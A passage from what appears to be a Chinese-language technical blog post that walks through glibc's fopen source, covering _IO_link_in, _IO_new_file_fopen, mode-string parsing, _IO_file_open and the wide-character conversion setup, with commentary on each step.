CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的主体就是调用了<code>_IO_link_in</code>函数，跟进去，函数在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_link_in</code>函数的功能是检查FILE结构体是否包含<code>_IO_LINKED</code>标志，如果不包含则表示这个结构体没有链接进入<code>_IO_list_all</code>，则再后面把它链接进入<code>_IO_list_all</code>链表，同时设置FILE结构体的<code>_chain</code>字段为之前的链表的值，否则直接返回。</p><p>所以<code>_IO_file_init</code>主要功能是将FILE结构体链接进入<code>_IO_list_all</code>链表，在没执行<code>_IO_file_init</code>函数前<code>_IO_list_all</code>指向的是<code>stderr</code>结构体</p><h2 id="0x4-IO-new-file-fopen"><a href="#0x4-IO-new-file-fopen" class="headerlink" title="0x4_IO_new_file_fopen"></a>0x4_IO_new_file_fopen</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_file_fopen ((FILE *) new_f, filename, mode, is32)</span><br></pre></td></tr></table></figure><p>注意：上面的函数调用过程中将 new_f 指针从 locked_FILE 转为了 FILE，这样做是合法的，因为 locked_FILE 中第一个变量_IO_FILE_plus 的首个变量即是 FILE，实际上这样做使得 new_f 指针的访问被截断，只能访问前面 FILE 中的内容。</p><p>这里做了符号映射，实际调用_IO_file_fopen 被映射为_IO_new_file_fopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">    <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  FILE *result;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))<span class="comment">//如果文件已经打开</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode)<span class="comment">//参数选项不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">  omode = O_RDWR;</span><br><span class="line">  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">  oflags |= O_EXCL;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">  oflags |= O_CLOEXEC;</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">/* Ignore.  */</span></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">  is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">      cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">     to wide.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      __set_errno (malloc_err);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment"> This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment"> for these.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      <span class="built_in">free</span> (ccs);</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-入参及局部变量准备"><a href="#1-入参及局部变量准备" class="headerlink" title="1.入参及局部变量准备"></a>1.入参及局部变量准备</h3><p>不多赘述，准备与 fopen 相关的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">210</span> FILE *</span><br><span class="line"><span class="number">211</span> _IO_new_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line"><span class="number">212</span>             <span class="type">int</span> is32not64)</span><br><span class="line"><span class="number">213</span> &#123;</span><br><span class="line"><span class="number">214</span>   <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line"><span class="number">215</span>   <span class="type">int</span> read_write;</span><br><span class="line"><span class="number">216</span>   <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line"><span class="number">217</span>   <span class="type">int</span> i;</span><br><span class="line"><span class="number">218</span>   FILE *result;</span><br><span class="line"><span class="number">219</span>   <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line"><span class="number">220</span>   <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br></pre></td></tr></table></figure><h3 id="2-如果文件已经打开，则返回-0"><a href="#2-如果文件已经打开，则返回-0" class="headerlink" title="2.如果文件已经打开，则返回 0"></a>2.如果文件已经打开，则返回 0</h3><p>判断方式也很简单，查看 fp 的_fileno 是否被赋值，正常打开一次之后，该值将被赋值为对应的 fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">222</span>   <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line"><span class="number">223</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">565</span> <span class="meta">#<span class="keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><h3 id="3-解析文件打开的-mode"><a href="#3-解析文件打开的-mode" class="headerlink" title="3.解析文件打开的 mode"></a>3.解析文件打开的 mode</h3><p>omode 记录 File access modes:只读/只写/读写</p><p>oflags 记录文件 open 的参数：</p><ul><li>O_CREAT：Create file if it doesn’t exist</li><li>O_TRUNC：Truncate file to zero length</li><li>O_APPEND：Writes append to the file</li><li>O_EXCL:Fail if file already exists</li><li>O_CLOEXEC:Set close_on_exec</li></ul><p>read_write 记录读写参数：</p><ul><li>_IO_NO_READS:Reading not allowed</li><li>_IO_NO_WRITES:Writing not allowed</li><li>_IO_IS_APPENDING:追加模式</li></ul><p>fp-&gt;_flags2 记录第二个 flags 信息：</p><ul><li>_IO_FLAGS2_MMAP：使用 mmap</li><li>_IO_FLAGS2_NOTCANCEL:不取消模式</li><li>_IO_FLAGS2_CLOEXEC:lose_on_exec</li></ul><p>last_recognized 记录最后检测到的模式。</p><h3 id="4-调用-IO-file-open-打开文件"><a href="#4-调用-IO-file-open-打开文件" class="headerlink" title="4.调用_IO_file_open 打开文件"></a>4.调用_IO_file_open 打开文件</h3><p>注意，这里大部分参数都是传入的，或者刚解析出来的，这个 oprot 是前文定义的局部变量<code>int oprot = 0666</code>,表示</p><ul><li><p>该文件拥有者对该文件拥有读写的权限但是没有操作的权限</p></li><li><p>该文件拥有者所在组的其他成员对该文件拥有读写的权限但是没有操作的权限</p></li><li><p>其他用户组的成员对该文件也拥有读写权限但是没有操作的权限</p></li></ul><p>调用_IO_file_open 的流程中大致可以分为如下几步：</p><ul><li><p>根据 flags2 决定是调用__open_nocancel 还是__open；</p></li><li><p>调用_IO_mask_flags 设定对应的 flags;</p></li><li>针对 append 模式，移动文件指针到_IO_seek_end；</li><li>将打开后的 fp link 到_IO_list_all 上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">280</span>   result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line"><span class="number">281</span>               is32not64);</span><br><span class="line"></span><br><span class="line"><span class="number">179</span> FILE *</span><br><span class="line"><span class="number">180</span> _IO_file_open (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line"><span class="number">181</span>            <span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line"><span class="number">182</span> &#123;</span><br><span class="line"><span class="number">183</span>   <span class="type">int</span> fdesc;</span><br><span class="line"><span class="number">184</span>   <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line"><span class="number">185</span>     fdesc = __open_nocancel (filename,</span><br><span class="line"><span class="number">186</span>                  posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="number">187</span>   <span class="keyword">else</span></span><br><span class="line"><span class="number">188</span>     fdesc = __open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="number">189</span>   <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">190</span>     <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">191</span>   fp-&gt;_fileno = fdesc;</span><br><span class="line"><span class="number">192</span>   _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line"><span class="number">193</span>   <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">194      update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line"><span class="number">195</span>   <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line"><span class="number">196</span>       == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line"><span class="number">197</span>     &#123;</span><br><span class="line"><span class="number">198</span>       <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line"><span class="number">199</span>       <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line"><span class="number">200</span>     &#123;</span><br><span class="line"><span class="number">201</span>       __close_nocancel (fdesc);</span><br><span class="line"><span class="number">202</span>       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">203</span>     &#125;</span><br><span class="line"><span class="number">204</span>     &#125;</span><br><span class="line"><span class="number">205</span>   _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"><span class="number">206</span>   <span class="keyword">return</span> fp;</span><br><span class="line"><span class="number">207</span> &#125;</span><br></pre></td></tr></table></figure><p>函数的主要功能就是执行<strong>系统调用<code>open</code>打开文件</strong>，<strong>并将文件描述符赋值给FILE结构体的<code>_fileno</code>字段</strong></p><p>最后再次调用<code>_IO_link_in</code>函数，确保该结构体被链接进入<code>_IO_list_all</code>链表。</p><h3 id="5-查看打开的文件是否需要特殊转换"><a href="#5-查看打开的文件是否需要特殊转换" class="headerlink" title="5.查看打开的文件是否需要特殊转换"></a>5.查看打开的文件是否需要特殊转换</h3><p>这里主要是针对宽字符进行相关的处理和模式设置，详细的内容就不赘述了，具体细节与正常的打开流程基本一致，最后设置宽字符的字符处理虚函数表_wide_vtable。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">     cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">     to wide.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      __set_errno (malloc_err);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment"> This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment"> for these.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      <span class="built_in">free</span> (ccs);</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Clear the state.  We start all over again.  